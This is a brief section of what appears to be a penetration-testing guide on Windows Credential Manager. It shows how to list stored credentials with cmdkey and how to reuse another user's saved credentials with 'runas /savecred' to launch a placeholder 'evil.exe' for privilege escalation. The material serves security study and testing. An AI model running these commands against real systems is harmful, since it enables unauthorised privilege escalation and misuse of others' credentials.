# Credential Manager

The Windows Credential Manager allows users to store login information for websites, applications, networks, etc. This section outlines how to check for credentials within the manager that may be leveraged for privilege escalation.

## Verification

List stored credentials using the following command to determine if any are present:

```batch
cmdkey /list
```

### Attack

While stored credentials can be viewed, **they cannot be extracted without elevated privileges**. However, they can be utilized, for example, if they belong to another user, using the **runas** command:

```batch
runas /savecred /user:[user] "C:\evil.exe"
```
